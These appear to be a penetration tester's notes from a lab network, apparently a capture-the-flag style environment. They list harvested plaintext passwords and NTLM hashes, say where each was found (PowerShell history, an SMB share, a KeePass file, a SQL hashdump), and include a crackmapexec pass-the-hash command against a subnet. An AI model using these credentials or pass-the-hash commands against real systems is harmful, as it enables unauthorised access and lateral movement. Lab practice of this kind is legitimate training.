```bash
test:t3st123  # used to execute PrintNightMare - https://github.com/m8sec/CVE-2021-34527
Ferus:MeatLoaf007 # Wordpress MySQL credentials, found on smbshare of WS02-ATHENA 10.10.110.25
Administrator:LongAgoFarAway # Administrator Credentials found for WS02-ATHENA 10.10.110.25 found in the powershell history
rbiscuit:pRdJh3RpL2 # Found in passwords.kdbx file in C:\users\richard\Desktop on WS02-ATHENA 10.10.110.25 as the Administrator User
sa:x5Chuz8XbM # Utilized for initial access to SQL01-HERA windows/mssql/mssql_payload
zach:1e39f2b205ee99f16ed8dbb0b97324b1 # Found in SQL01-HERA hashdump
rbiscuit_adm: # Username found on 10.10.110.5 with net users
```


# Users List
```bash
test
Ferus
Administrator
rbiscuit
zach
rbiscuit_adm
egre55
lucian
```
# Password List
```bash
t3st123
MeatLoaf007
LongAgoFarAway
pRdJh3RpL2
x5Chuz8XbM
```



# 10.10.110.20 hashdump
crackmapexec smb 10.10.110.0/24 -u egre55 -H 6f5aaabac58674288d8b66652db4f306
```powershell
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b8dcee366b89102ef8681f3a1261e475:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
egre55:1001:aad3b435b51404eeaad3b435b51404ee:6f5aaabac58674288d8b66652db4f306:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1002:aad3b435b51404eeaad3b435b51404ee:e50c5c6dad5107c43cf73de583a90837:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:50abdc6825ebd81fa03d434559a7b1fb:::
```
